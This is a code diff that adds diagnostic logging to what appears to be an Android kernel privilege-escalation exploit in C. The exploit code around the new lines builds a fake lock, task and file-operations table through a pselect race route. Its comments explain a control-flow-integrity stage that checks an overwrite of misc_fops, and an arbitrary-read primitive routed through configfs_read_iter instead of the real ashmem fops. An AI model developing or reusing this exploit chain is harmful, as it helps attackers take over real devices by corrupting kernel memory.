@@ -161,6 +161,15 @@ void do_pselect_fake_lock_route(void) {
       break;
     }
 
+    // Same reason as the slide route's pre-race line: these are the addresses
+    // the chain walk is supposed to travel through, and without them a failed
+    // attempt leaves nothing to check the outcome against.
+    pr_info("pselect page attempt=%d page_base=%016llx fake_lock=%016llx "
+            "fake_w0=%016llx fake_task=%016llx fake_fops=%016llx\n",
+            route_attempt, (unsigned long long)page_base,
+            (unsigned long long)fake_lock, (unsigned long long)fake_w0,
+            (unsigned long long)fake_task, (unsigned long long)fake_fops);
+
     fd_set in;
     fd_set out;
     fd_set ex;
@@ -342,6 +351,19 @@ int try_cfi_stage(void) {
     fops_before = pre_fops;
     cfi_last_step = 4;
     cfi_last_errno = errno;
+    // Step 4 is the "did the overwrite land" gate and it is where tegu stops,
+    // so say which half failed. pre_rb short means the read primitive itself
+    // is not up — expected while misc_fops still points at the real ashmem
+    // fops, because then pread() dispatches to ashmem rather than to
+    // configfs_read_iter. A full read with the wrong value means the primitive
+    // works and the slot simply is not ours.
+    pr_warning("cfi step4 pre_rb=%zd errno=%d slot=%016llx want_fake_fops=%016llx "
+               "real_ashmem_fops=%016llx misc_fops=%016llx page_base=%016llx\n",
+               pre_rb, cfi_last_errno, (unsigned long long)pre_fops,
+               (unsigned long long)fake_fops,
+               (unsigned long long)text_addr(ASHMEM_FOPS),
+               (unsigned long long)misc_fops,
+               (unsigned long long)page_base);
     goto fail;
   }
 
